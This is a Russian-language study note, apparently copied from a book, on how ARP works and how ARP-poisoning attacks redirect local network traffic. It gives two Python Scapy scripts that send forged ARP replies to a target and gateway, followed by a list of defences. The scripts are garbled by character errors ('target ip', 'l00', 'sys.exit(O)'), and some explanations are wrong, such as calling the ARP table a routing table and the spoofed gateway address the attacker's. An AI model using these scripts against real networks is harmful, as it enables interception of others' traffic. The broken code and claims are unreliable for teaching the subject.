#security 

==Как работает ARP:==
- _**Запрос ARP (ARP Request)**_: когда устройство хочет отправить данные другому устройству в локальной сети, оно сначала отправляет широкове­щательный АRР-запрос. Этот запрос содержит IР-адрес устройства-полу­чателя, и все устройства в сети получают этот запрос.
- _**Ответ ARP (ARP Reply)**_: устройство с указанным IР-адресом отвечает на запрос, отправляя свой МАС-адрес в ответ. Этот ответ направляется только к устройству, сделавшему запрос.
- _**Кэширование ARP**_: оба устройства сохраняют информацию об IP- и МАС-адресах друг друга в своих АRР-таблицах для ускорения будущих коммуникаций.

==Пример АRР-запроса и ответа:==
```
# Запрос ARP:
Кто имеет IР-адрес 192.168.0.1? (передается всем в сети)

# Ответ ARP:
Устройство с IР-адресом 192.168.0.1 отвечает: у меня МАС-адрес 00:0a:95:9d:68:16.
```

==Процесс АRР-отравления:==
- _**Перехват АRР-таблицы**_: злоумышленник начинает с перехвата АRР­ таблицы (таблицы маршрутизации) устройства в локальной сети. Эта таблица содержит сопоставления между IР-адресами и МАС-адресами других устройств в сети.
- _**Фальсификация АRР-ответов**_: злоумышленник отправляет ложные АRР-ответы, в которых он утверждает, что его МАС-адрес является МАС-адресом целевого устройства с определенным IР-адресом. Таким образом, злоумышленник становится "мостом" между целевым устрой­ством и остальной сетью.
- _**Перенаправление трафика**_: после успешной фальсификации АRР­ таблицы злоумышленник начинает перенаправлять весь сетевой тра­фик, предназначенный для целевого устройства, через свое собственное устройство. Это позволяет злоумышленнику перехватывать, анализиро­вать и даже изменять сетевой трафик, проходящий между целевым устрой­ством и другими устройствами в сети.

> АRР-отравление является серьезной угрозой для безопасности сети, по­скольку злоумышленнику удается перехватывать чувствительные данные и имитировать целевое устройство.

==Пример реализации АRР-отравления с использованием библиотеки Scapy на языке Python==
```python
# Пример реализации АRР-отравления 
from scapy.all import *

# Указание целевого устройства и маршрутизатора 
target_ip = "192.168.0.105"  
gateway_ip = "192.168.0.1"

# Получение МАС-адресов целевого устройства и маршрутизатора
def get_mac(ip):  
	ans, unans = arping(ip) 
	for snt, rcv in ans:
		return rcv[Ether].src
		
target_mac = get_mac(target ip) 
gateway_mac = get_mac(gateway_ip)

# Отправка ложных АRР-ответов
def spoof(target_ip, spoof_ip, target_mac):
	packet = ARP(op=2, pdst=target ip, psrc=spoof_ip, hwdst=target_mac)
	send(packet, verbose=False)
	
try:
	while True:
		spoof(target ip, gateway ip, target_mac)
		spoof(gateway_ip, target ip, gateway_mac) 
		time.sleep(2)
except Keyboardinterrupt: 
	print("Aтaкa прервана")
	sys.exit(O)
```

==Еще пример==
```python
# АRР-отравления с использованием Python и Scapy 
from scapy.all import ARP, Ether, sendp

# Создаем АRР-пакет для отравления
def craft_arp_packet(target_ip, target_mac, spoof_ip): 
	arp = ARP(op=2, pdst=target ip, psrc= spoof_ip,hwdst=target_mac)
	ether = Ether(dst=target_mac) 
	return ether/arp
	
# Отправляем отравленные АRР-пакеты  
def send_arp_packets(packet, count=l00):
	sendp(packet, count=count, verbose= False)
	
# Основная функция
def arp_poisoning(target ip, target_mac, spoof ip, count=l00):
	arp_packet_= craft_arp_packet(target_ip, target_mac, spoof_ip)  
	send_arp_packets(arp_packet, count)
	
# Пример использования

if __name__ == "__main__"·  
	target ip = "192.168.0.100" # IР-адрес целевого устройства
	target_mac = "AA:BB:CC:DD:EE:FF" # МАС-адрес целевого устройства
	spoof_ip = "192.168.0.1" # IР-адрес атакующего устройства
	arp_poisoning(target ip, target_mac, spoof_ip)
```
В этом примере создается АRР-пакет с помощью библиотеки Scapy, кото­рый содержйт информацию о целевом источнике IР-адреса и МАС-адреса. Затем этот пакет отправляется на целевое устройство с помощью функции `send_arp_packets()`.

При достаточном количестве отправленных пакетов происходит фальси­фикация АRР-таблицы у целевого устройства, и весь его сетевой трафик на­чинает проходить через атакующее устройство.

==Примеры защиты от атак на сетевом уровне==
- _**Использование статических АRР-записей**_. Настройка статических АRР-записей на ключевых устройствах сети может предотвратить АRР­ отравление, так как эти записи не могут быть изменены динамически.

- _**Внедрение DHCP Snooping и Dynamic ARP lnspection.**_ Эти методы могут использоваться на коммутаторах для проверки подлинности АRР­ сообщений и предотвращения атак.

- _**Шифрование сетевого трафика**_. Использование протоколов, таких как SSL/TLS и IPsec, для шифрования данных, передаваемых по сети, может защитить от сниффинга, так как перехваченные данные будут недоступ­ны для злоумышленника без ключа расшифровки.

- _**Мониторинг сети и системы обнаружения вторжений (IDS)**_. Регуляр­ный мониторинг сетевого трафика и использование IDS могут помочь в обнаружении и реагировании на подозрительную активность в сети.
